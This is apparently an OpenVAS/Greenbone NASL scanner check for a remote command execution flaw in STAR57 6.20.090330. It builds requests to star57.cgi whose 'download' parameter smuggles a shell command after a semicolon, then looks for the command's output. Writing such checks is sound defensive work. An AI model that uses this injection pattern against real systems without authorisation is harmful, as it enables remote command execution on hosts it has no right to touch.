if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103928" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "STAR57 6.20.090330 Remote Command Execution" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/125824/STAR57-6.20.090330-Remote-Command-Execution.html" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-03-24 11:15:12 +0100 (Mon, 24 Mar 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploits will allow remote attackers to execute arbitrary
commands within the context of the application." );
	script_tag( name: "vuldetect", value: "Try to execute a command on the remote Host by sending some special crafted HTTP requests." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "STAR57 6.20.090330 suffer from a code execution vulnerability." );
	script_tag( name: "affected", value: "STAR57 6.20.090330" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
cmds = exploit_commands();
for dir in nasl_make_list_unique( "/star57cm", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for cmd in keys( cmds ) {
		url = dir + "/star57.cgi?download=;" + cmds[cmd] + "|";
		if(http_vuln_check( port: port, url: url, pattern: cmd )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

